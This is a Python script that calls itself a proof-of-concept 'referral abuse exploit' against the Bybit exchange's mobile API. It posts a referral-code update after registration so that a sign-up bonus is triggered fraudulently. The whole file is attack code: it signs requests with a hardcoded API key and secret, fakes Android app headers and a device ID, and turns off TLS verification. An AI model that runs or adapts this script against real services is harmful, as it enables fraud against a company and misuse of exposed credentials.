#!/usr/bin/env python3
"""
Bybit Mobile Referral Abuse Exploit (PoC)
Target: /app/v1/user/referral/update
Logic: Update referral code AFTER registration to trigger bonus.
"""
import requests
import time
import hmac
import hashlib
import json

# --- CONFIGURATION ---
# NOTE: Mobile endpoints often use different auth or just token. 
# We try standard v5 signature first, as it often works for app/ endpoints too.
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"
REFERRAL_CODE = "JACKPOT2025" 

def get_mobile_headers(payload):
    timestamp = str(int(time.time() * 1000))
    recv_window = "5000"
    sign_payload = f"{timestamp}{API_KEY}{recv_window}{payload}"
    signature = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()
    
    return {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": signature,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": timestamp,
        "X-BAPI-RECV-WINDOW": recv_window,
        "Content-Type": "application/json",
        # Spoofing Mobile App
        "User-Agent": "Bybit/4.32.0 (Android 13; Pixel 7 Pro)",
        "platform": "android",
        "X-App-Version": "4.32.0",
        "X-Device-Id": "c8299384-1234-4567-89ab-1234567890ab", # Random UUID
        "lang": "en-US"
    }

def exploit():
    print(f"[*] Attempting Referral Update on Mobile Endpoint...")
    
    endpoint = "/app/v1/user/referral/update"
    
    payload = {
        "referralCode": REFERRAL_CODE
    }
    
    json_payload = json.dumps(payload)
    headers = get_mobile_headers(json_payload)
    
    try:
        r = requests.post(f"{BASE_URL}{endpoint}", data=json_payload, headers=headers, verify=False)
        print(f"\nStatus: {r.status_code}")
        print(f"Response: {r.text}")
        
        if r.status_code == 404:
            print("[-] Endpoint not found (might have moved to v2 or v3)")
        elif r.status_code == 200:
            print("[+] Endpoint HIT! Check response content.")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()
